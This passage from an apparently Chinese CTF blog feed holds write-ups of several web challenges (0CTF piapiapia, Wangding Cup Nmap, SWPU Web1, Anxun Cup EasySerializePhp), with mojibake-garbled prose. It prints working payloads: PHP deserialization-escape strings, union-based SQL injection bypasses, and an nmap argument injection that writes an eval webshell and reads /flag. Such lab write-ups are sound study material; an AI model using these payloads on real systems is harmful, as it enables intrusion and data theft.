â€ƒè¿˜æ˜¯å›žåˆ°è¿™ä¸€é“é¢˜ä¸Šï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯å°†â€;}s:5:â€photoâ€;s:10:â€config.phpâ€;}æ’å…¥åºåˆ—åŒ–çš„å­—ç¬¦ä¸²é‡Œé¢åŽ»ï¼Œè¿™ä¸ªçš„é•¿åº¦ä¸º34ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æŒ¤å‡ºæ¥34ä½ï¼Œä¸ç„¶å°±æˆäº†nicknameçš„å€¼äº†ã€‚whereä¼šæ›¿æ¢æˆhackerï¼Œé•¿åº¦åŠ 1ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æž„é€ 34ä¸ªwhereã€‚ç„¶åŽåŽ»profile.phpæŸ¥çœ‹è¯»å–çš„å†…å®¹ã€‚</p><h3 id="è¯¦ç»†æ­¥éª¤"><a href="#è¯¦ç»†æ­¥éª¤" class="headerlink" title="è¯¦ç»†æ­¥éª¤"></a>è¯¦ç»†æ­¥éª¤</h3><ul><li>æ³¨å†Œè´¦æˆ·</li><li>ç™»å½•è´¦æˆ·</li><li>éšæ„æäº¤ä¸€äº›èµ„æ–™æŠ“åŒ…</li><li>ä¿®æ”¹nicknameä¸ºnickname[]ï¼Œæ•°ç»„ç»•è¿‡é•¿åº¦æ£€æµ‹</li><li>ä¿®æ”¹nicknameä¸­çš„å†…å®¹</li></ul><pre class=" language-php"><code class="language-php">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="token string">";}s:5:"</span>photo<span class="token string">";s:10:"</span>config<span class="token punctuation">.</span>php"<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="/2021/07/12/0ctf-2016-piapiapia/image-20210712010334089.png" alt="image-20210712010334089"></p><p>ç„¶åŽç‚¹å‡»è·³è½¬åˆ°profile.php,f12æŸ¥çœ‹å¹¶base64è§£ç </p><p><img src="/2021/07/12/0ctf-2016-piapiapia/image-20210712010116364.png" alt="image-20210712010116364"></p><p><img src="/2021/07/12/0ctf-2016-piapiapia/image-20210712010058578.png" alt="image-20210712010058578"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘é¼Žæ¯:2020-Nmap</title>
      <link href="2021/07/11/wang-ding-bei-2020-nmap/"/>
      <url>2021/07/11/wang-ding-bei-2020-nmap/</url>
      
        <content type="html"><![CDATA[<p>è¿™é¢˜å’ŒBuuctf:2018-OnlineToolç±»ä¼¼ç›´æŽ¥ç”¨payload</p><pre class=" language-php"><code class="language-php"><span class="token string">' &lt;?= @eval($_POST[1]);?> -oG 1.php '</span></code></pre><p>å› ä¸ºPHPè¢«è¿‡æ»¤æ‰€ä»¥é‡‡ç”¨phtmlï¼š</p><pre class=" language-PHP"><code class="language-PHP">' <?= @eval($_POST[1]);?> -oG 1.phtml '</code></pre><p>èšå‰‘è¿žæŽ¥url/1.phtmlç„¶åŽåœ¨è™šæ‹Ÿç»ˆç«¯cat /flag</p><p><img src="/2021/07/11/wang-ding-bei-2020-nmap/image-20210712230221620.png" alt="image-20210712230221620"></p><p>æ›´ç®€å•çš„æ–¹æ³•ï¼š</p><pre><code>127.0.0.1' -iL /flag -oN 1.txt '</code></pre><p><img src="/2021/07/11/wang-ding-bei-2020-nmap/image-20210712230652799.png" alt="image-20210712230652799"></p>]]></content>
      
      
      
        <tags>
            
            <tag> nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPU:2019-Web1</title>
      <link href="2021/07/10/swpu-2019-web1/"/>
      <url>2021/07/10/swpu-2019-web1/</url>
      
        <content type="html"><![CDATA[<p>ä¸€ä¸ªç™»å½•ç•Œé¢</p><p>éšä¾¿æ³¨å†Œç”¨æˆ·ç™»å½•ä»¥åŽ</p><p><img src="/2021/07/10/swpu-2019-web1/1.png" alt="1"></p><p>è¾“å…¥1â€˜</p><p><img src="/2021/07/10/swpu-2019-web1/2.png" alt="2"></p><p>è¾“å…¥order byæ˜¯æç¤ºæ ‡é¢˜å«æœ‰æ•æ„Ÿè¯æ±‡,</p><p>é¢˜ç›®çŽ¯å¢ƒè¿‡æ»¤äº†ç©ºæ ¼ï¼Œæˆ‘ä»¬ä½¿ç”¨/**/æ¥è¿›è¡Œç»•è¿‡è¿‡æ»¤äº†orï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•ä½¿ç”¨order by ä»¥åŠinformation_schemaè¿™ä¸ªåº“å› ä¸ºè¿‡æ»¤äº†æ³¨é‡Šç¬¦ï¼Œæ‰€ä»¥æŸ¥è¯¢è¯­å¥çš„æœ€åŽæˆ‘ä»¬è¦é—­åˆå•å¼•å·</p><pre class=" language-php"><code class="language-php"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21/**/'</span></code></pre><p><img src="/2021/07/10/swpu-2019-web1/3.png" alt="3"></p><pre><code>-1'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'</code></pre><p>æ— æŠ¥é”™</p><p><img src="/2021/07/10/swpu-2019-web1/4.png" alt="4"></p><pre><code>-1'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23/**/'</code></pre><p>ç”±æ­¤å¯è§æœ‰22åˆ—å›žæ˜¾åœ¨2,3å¤„</p><p><img src="/2021/07/10/swpu-2019-web1/3.png" alt="3"></p><p>æŸ¥è¡¨</p><pre class=" language-php"><code class="language-php"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'</span></code></pre><p><img src="/2021/07/10/swpu-2019-web1/5.png" alt="5"></p><p>è®¾ç¬¬äºŒåˆ—åˆ«åä¸ºb</p><pre class=" language-php"><code class="language-php"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/b,3/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'</span></code></pre><p><img src="/2021/07/10/swpu-2019-web1/6.png" alt="6"></p><p>è®¾ç¬¬ä¸‰åˆ—åˆ«åä¸ºb</p><pre class=" language-php"><code class="language-php"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'</span></code></pre><p><img src="/2021/07/10/swpu-2019-web1/7.png" alt="7"></p><h2 id="æ— åˆ—åæ³¨å…¥"><a href="#æ— åˆ—åæ³¨å…¥" class="headerlink" title="æ— åˆ—åæ³¨å…¥"></a>æ— åˆ—åæ³¨å…¥</h2><p>åœ¨ mysql =&gt; 5 çš„ç‰ˆæœ¬ä¸­å­˜åœ¨åº“information_schema,è®°å½•ç€mysqlä¸­æ‰€æœ‰è¡¨çš„ç»“æž„ï¼Œé€šå¸¸ï¼Œåœ¨mysql sqliä¸­ï¼Œæˆ‘ä»¬ä¼šé€šè¿‡æ­¤åº“ä¸­çš„è¡¨åŽ»èŽ·å–å…¶ä»–è¡¨çš„ç»“æž„ï¼Œå³è¡¨åï¼Œåˆ—åç­‰ã€‚ä½†æ˜¯è¿™ä¸ªåº“ä¹Ÿä¼šç»å¸¸è¢«WAFè¿‡æ»¤ã€‚å½“æˆ‘ä»¬é€šè¿‡æš´åŠ›ç ´è§£èŽ·å–åˆ°è¡¨ååŽï¼Œè¯¥å¦‚ä½•è¿›è¡Œä¸‹ä¸€æ­¥åˆ©ç”¨å‘¢ï¼Ÿ</p><p>åœ¨information_schemaä¸­ï¼Œé™¤äº†SCHEMATAï¼ŒTABLESï¼ŒCOLUMNSæœ‰è¡¨ä¿¡æ¯å¤–ï¼Œé«˜ç‰ˆæœ¬çš„mysqlä¸­ï¼Œè¿˜æœ‰INNODB_TABLESåŠINNODB_COLUMNSä¸­è®°å½•ç€è¡¨ç»“æž„ã€‚</p><p><a href="https://links.jianshu.com/go?to=https://evi1cg.me/archives/sqli_without_knowing_columns_names.html%230x01-%E4%B8%8D%E4%BD%BF%E7%94%A8%E8%A1%A8%E5%90%8D%E6%9F%A5%E8%AF%A2">0x01 ä¸ä½¿ç”¨è¡¨åæŸ¥è¯¢</a></p><p>æ­£å¸¸çš„æŸ¥è¯¢å¦‚ä¸‹ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/16739626-e310681eae4f665f.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/978" alt="img"></p><p>å…¶ä¸­ï¼Œåˆ—åä¸ºid,name,pass,mail,phoneï¼Œä½¿ç”¨unionæŸ¥è¯¢</p><pre class=" language-php"><code class="language-php">select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> union select <span class="token operator">*</span> from users<span class="token punctuation">;</span></code></pre><p><img src="https://upload-images.jianshu.io/upload_images/16739626-41f2e37c6267d297.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1004" alt="img"></p><p>æŽ¥ç€ï¼Œå°±å¯ä»¥ç»§ç»­ä½¿ç”¨æ•°å­—æ¥å¯¹åº”åˆ—,å¦‚3å¯¹åº”äº†è¡¨é‡Œé¢çš„pass:</p><pre class=" language-php"><code class="language-php">select `<span class="token number">3</span>` <span class="token function">from</span> <span class="token punctuation">(</span>select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> union select <span class="token operator">*</span> from users<span class="token punctuation">)</span>a<span class="token punctuation">;</span></code></pre><p><img src="https://upload-images.jianshu.io/upload_images/16739626-4a4ddedcaecd3838.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200" alt="img"></p><p>å½“ ` ä¸èƒ½ä½¿ç”¨çš„æ—¶å€™ï¼Œä½¿ç”¨åˆ«åæ¥ä»£æ›¿ï¼š</p><pre class=" language-php"><code class="language-php">select b <span class="token function">from</span> <span class="token punctuation">(</span>select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">as</span> b<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> union select <span class="token operator">*</span> from users<span class="token punctuation">)</span>a<span class="token punctuation">;</span></code></pre><p><img src="https://upload-images.jianshu.io/upload_images/16739626-d081adfc464a4fd3.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200" alt="img"></p><p>åœ¨æ³¨å…¥ä¸­æŸ¥è¯¢å¤šä¸ªåˆ—ï¼š</p><pre class=" language-php"><code class="language-php">select <span class="token function">concat</span><span class="token punctuation">(</span>`<span class="token number">2</span>`<span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>`<span class="token number">3</span>`<span class="token punctuation">)</span> <span class="token function">from</span> <span class="token punctuation">(</span>select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> union select <span class="token operator">*</span> from users<span class="token punctuation">)</span>a limit <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span></code></pre><p><img src="https://upload-images.jianshu.io/upload_images/16739626-f62f28bafcd3774e.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200" alt="img"></p><p>FROM:<a href="https://links.jianshu.com/go?to=https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/">Extracting data without knowing columns names </a></p><p>å‚è€ƒï¼š<a href="https://www.jianshu.com/p/6eba3370cfab">https://www.jianshu.com/p/6eba3370cfab</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> æ— åˆ—åæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å®‰æ´µæ¯:2019-EasySerializePhp</title>
      <link href="2021/07/09/an-xun-bei-2019-easyserializephp/"/>
      <url>2021/07/09/an-xun-bei-2019-easyserializephp/</url>
      
        <content type="html"><![CDATA[<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'php'</span><span class="token punctuation">,</span><span class="token string">'flag'</span><span class="token punctuation">,</span><span class="token string">'php5'</span><span class="token punctuation">,</span><span class="token string">'php4'</span><span class="token punctuation">,</span><span class="token string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'/i'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'guest'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'&lt;a href="index.php?f=highlight_file">source_code&lt;/a>'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'highlight_file'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//maybe you can find something in here!</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> </code></pre><p>æç¤ºåœ¨phpinfoä¸­æ‰¾ä¸œè¥¿</p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>f<span class="token operator">=</span>phpinfo</code></pre><p><img src="/2021/07/09/an-xun-bei-2019-easyserializephp/image-20210712021749634.png" alt="image-20210712021749634"></p><p>é‚£ä¹ˆçŽ°åœ¨å°±æ˜¯è¦å°è¯•è¯»å–è¿™ä¸ªæ–‡ä»¶</p><p>é¢˜ç›®æ˜¯å…ˆåºåˆ—åŒ–$_SESSIONï¼Œç„¶åŽå†ç»è¿‡ä¸€ä¸ªè¿‡æ»¤å‡½æ•°ï¼Œç„¶åŽå†ååºåˆ—åŒ–ï¼Œè¿™æ ·å°±äº§ç”Ÿäº†ä¸€ä¸ªé—®é¢˜ï¼Œè¿‡æ»¤å‡½æ•°ä¼šæ›¿æ¢æŽ‰ä¸€äº›å…³é”®è¯ï¼Œè¿™æ ·å°±ä¼šé€ æˆååºåˆ—åŒ–çš„å¯¹è±¡é€ƒé€¸é—®é¢˜~~</p><ul><li>ç¬¬ä¸€ç§ä¸ºå…³é”®è¯æ•°å¢žåŠ <br>ä¾‹å¦‚ï¼š where-&gt;hackerï¼Œè¿™æ ·è¯æ•°ç”±äº”ä¸ªå¢žåŠ åˆ°6ä¸ª</li><li>ç¬¬äºŒç§ä¸ºå…³é”®è¯æ•°å‡å°‘<br>ä¾‹å¦‚ï¼šç›´æŽ¥è¿‡æ»¤æŽ‰ä¸€äº›å…³é”®è¯ï¼Œä¾‹å¦‚è¿™é“é¢˜ç›®ä¸­</li><li>ç¬¬ä¸€ç§æƒ…å†µæ¯”è¾ƒå¥½æž„é€ ï¼Œç›´æŽ¥æž„é€ å¤šä¸ªå…³é”®è¯ï¼Œè¿™æ ·å°±èƒ½é€ƒå‡ºå‡ ä¸ªå­—ç¬¦~~</li><li>ç¬¬äºŒç§å¯ä»¥æ˜¯é€šè¿‡é”®é€ƒé€¸å’Œå€¼é€ƒé€¸~~</li></ul><p>$userinfoåˆæ˜¯é€šè¿‡$serialize_infoååºåˆ—åŒ–æ¥çš„ã€‚</p><p>$serialize_infoåˆæ˜¯é€šè¿‡sessionåºåˆ—åŒ–ä¹‹åŽå†è¿‡æ»¤å¾—æ¥çš„ã€‚</p><h3 id="Payload1-å€¼é€ƒé€¸"><a href="#Payload1-å€¼é€ƒé€¸" class="headerlink" title="Payload1:å€¼é€ƒé€¸"></a>Payload1:å€¼é€ƒé€¸</h3><p>è¿™å„¿éœ€è¦ä¸¤ä¸ªè¿žç»­çš„é”®å€¼å¯¹ï¼Œç”±ç¬¬ä¸€ä¸ªçš„å€¼è¦†ç›–ç¬¬äºŒä¸ªçš„é”®ï¼Œè¿™æ ·ç¬¬äºŒä¸ªå€¼å°±é€ƒé€¸å‡ºåŽ»ï¼Œå•ç‹¬ä½œä¸ºä¸€ä¸ªé”®å€¼å¯¹~~</p><pre class=" language-php"><code class="language-php"><span class="token constant">_SESSION</span><span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token operator">=</span>flagflagflagflagflagflag<span class="token operator">&amp;</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span><span class="token keyword">function</span><span class="token punctuation">]</span><span class="token operator">=</span>a<span class="token string">";s:3:"</span>img<span class="token string">";s:20:"</span>ZDBnM19mMWFnLnBocA<span class="token operator">==</span><span class="token string">";s:2:"</span>dd<span class="token string">";s:1:"</span>a"<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>show_image</code></pre><p>ZDBnM19mMWFnLnBocA==ä¸ºd0g3_f1ag.phpçš„base64ç¼–ç </p><p><img src="/2021/07/09/an-xun-bei-2019-easyserializephp/image-20210712023548011.png" alt="image-20210712023548011"></p><p>è¯»å–/d0g3_fllllllagï¼š</p><pre><code>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";s:2:"dd";s:1:"a";}&amp;function=show_image</code></pre><p><img src="/2021/07/09/an-xun-bei-2019-easyserializephp/image-20210712023457458.png" alt="image-20210712023457458"></p><p>var_dumpçš„ç»“æžœä¸ºï¼š</p><pre class=" language-php"><code class="language-php"><span class="token string">"a:3:{s:4:"</span>user<span class="token string">";s:24:"</span><span class="token string">";s:8:"</span><span class="token keyword">function</span><span class="token string">";s:59:"</span>a<span class="token string">";s:3:"</span>img<span class="token string">";s:20:"</span>ZDBnM19mMWFnLnBocA<span class="token operator">==</span><span class="token string">";s:2:"</span>dd<span class="token string">";s:1:"</span>a<span class="token string">";}"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"Z3Vlc3RfaW1nLnBuZw=="</span><span class="token punctuation">;</span><span class="token punctuation">}</span>"</code></pre><h3 id="Payload2-é”®é€ƒé€¸"><a href="#Payload2-é”®é€ƒé€¸" class="headerlink" title="Payload2:é”®é€ƒé€¸"></a>Payload2:é”®é€ƒé€¸</h3><h3 id="è¿™å„¿åªéœ€è¦ä¸€ä¸ªé”®å€¼å¯¹å°±è¡Œäº†ï¼Œæˆ‘ä»¬ç›´æŽ¥æž„é€ ä¼šè¢«è¿‡æ»¤çš„é”®ï¼Œè¿™æ ·å€¼å¾—ä¸€éƒ¨åˆ†å……å½“é”®ï¼Œå‰©ä¸‹å¾—ä¸€éƒ¨åˆ†ä½œä¸ºå•ç‹¬å¾—é”®å€¼å¯¹"><a href="#è¿™å„¿åªéœ€è¦ä¸€ä¸ªé”®å€¼å¯¹å°±è¡Œäº†ï¼Œæˆ‘ä»¬ç›´æŽ¥æž„é€ ä¼šè¢«è¿‡æ»¤çš„é”®ï¼Œè¿™æ ·å€¼å¾—ä¸€éƒ¨åˆ†å……å½“é”®ï¼Œå‰©ä¸‹å¾—ä¸€éƒ¨åˆ†ä½œä¸ºå•ç‹¬å¾—é”®å€¼å¯¹" class="headerlink" title="è¿™å„¿åªéœ€è¦ä¸€ä¸ªé”®å€¼å¯¹å°±è¡Œäº†ï¼Œæˆ‘ä»¬ç›´æŽ¥æž„é€ ä¼šè¢«è¿‡æ»¤çš„é”®ï¼Œè¿™æ ·å€¼å¾—ä¸€éƒ¨åˆ†å……å½“é”®ï¼Œå‰©ä¸‹å¾—ä¸€éƒ¨åˆ†ä½œä¸ºå•ç‹¬å¾—é”®å€¼å¯¹~~"></a>è¿™å„¿åªéœ€è¦ä¸€ä¸ªé”®å€¼å¯¹å°±è¡Œäº†ï¼Œæˆ‘ä»¬ç›´æŽ¥æž„é€ ä¼šè¢«è¿‡æ»¤çš„é”®ï¼Œè¿™æ ·å€¼å¾—ä¸€éƒ¨åˆ†å……å½“é”®ï¼Œå‰©ä¸‹å¾—ä¸€éƒ¨åˆ†ä½œä¸ºå•ç‹¬å¾—é”®å€¼å¯¹~~</h3><pre class=" language-php"><code class="language-php"><span class="token constant">_SESSION</span><span class="token punctuation">[</span>flagphp<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>var_dumpçš„ç»“æžœä¸ºï¼š</p><pre class=" language-php"><code class="language-php"><span class="token constant">_SESSION</span><span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token operator">=</span>flagflagflagflagflagflag<span class="token operator">&amp;</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span><span class="token keyword">function</span><span class="token punctuation">]</span><span class="token operator">=</span>a<span class="token string">";s:3:"</span>img<span class="token string">";s:20:"</span>L2QwZzNfZmxsbGxsbGFn<span class="token string">";s:2:"</span>dd<span class="token string">";s:1:"</span>a"<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>show_image</code></pre><p><img src="/2021/07/09/an-xun-bei-2019-easyserializephp/image-20210718221328853.png" alt="image-20210718221328853"></p><p>è¿™å„¿å¾—s:7:â€â€ä¹‹æ‰€ä»¥ä¸ºç©ºï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬æž„é€ å¾—é”®flagphpéƒ½æ˜¯ä¼šè¢«è¿‡æ»¤å¾—ï¼Œæ‰€ä»¥æ˜¾ç¤ºä¸ºç©ºï¼Œè¿™æ ·å°±èƒ½åƒæŽ‰ä¸€éƒ¨åˆ†å€¼äº†ï¼Œç„¶åŽå°†å‰©ä¸‹å¾—å€¼å……å½“å¦ä¸€ä¸ªå¯¹è±¡é€ƒé€¸å‡ºåŽ»~~</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Web:PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</title>
      <link href="2021/07/08/web-php-fan-xu-lie-hua-zi-fu-tao-yi/"/>
      <url>2021/07/08/web-php-fan-xu-lie-hua-zi-fu-tao-yi/</url>
      
        <content type="html"><![CDATA[<p>å†™çš„å¾ˆå¥½å°±è½¬è½½äº†:<a href="https://www.cnblogs.com/Sumarua/">https://www.cnblogs.com/Sumarua/</a></p><p>è¿™æ®µæ—¶é—´é‡åˆ°å‡ ä¸ªå…³äºŽååºåˆ—åŒ–çš„å­—ç¬¦é€ƒé€¸çš„ç¨‹åºï¼Œä»Šå¤©æ¥åˆ†äº«ä¸€ä¸‹ç»éªŒã€‚</p><pre><code>&lt;?phpfunction filter($str){    return str_replace('bb', 'ccc', $str);}class A{    public $name='aaaa';    public $pass='123456';}$AA=new A();$res=filter(serialize($AA));$c=unserialize($res);echo $c-&gt;pass;?&gt;</code></pre><p>ä»¥ä¸Šé¢ä»£ç ä¸ºä¾‹ï¼Œå¦‚ä½•åœ¨ä¸ç›´æŽ¥ä¿®æ”¹$passå€¼çš„æƒ…å†µä¸‹é—´æŽ¥ä¿®æ”¹$passçš„å€¼ã€‚</p><p>ä»£ç çš„æµç¨‹ä¸ºï¼š</p><p>å…ˆåºåˆ—åŒ–ä»£ç ï¼Œç„¶åŽå°†é‡Œé¢ä¸å¸Œæœ›å‡ºçŽ°çš„å­—ç¬¦æ›¿æ¢æˆè‡ªå®šä¹‰çš„å­—ç¬¦ä¸²ã€‚ç„¶åŽè¿›è¡Œååºåˆ—åŒ–ï¼Œæœ€åŽè¾“å‡ºpasså˜é‡ã€‚</p><p>è¦è§£å†³ä¸Šé¢è¿™ä¸ªé—®é¢˜ï¼Œå…ˆæ¥çœ‹ä¸€ä¸‹phpåºåˆ—åŒ–ä»£ç çš„ç‰¹å¾ã€‚</p><p><img src="https://s1.ax1x.com/2020/05/21/YqFpH1.png" alt="1"></p><p>åœ¨ååºåˆ—åŒ–çš„æ—¶å€™phpä¼šæ ¹æ®sæ‰€æŒ‡å®šçš„å­—ç¬¦é•¿åº¦åŽ»è¯»å–åŽè¾¹çš„å­—ç¬¦ã€‚</p><p>å¦‚æžœæŒ‡å®šçš„é•¿åº¦é”™è¯¯åˆ™ååºåˆ—åŒ–å°±ä¼šå¤±è´¥ã€‚</p><p><img 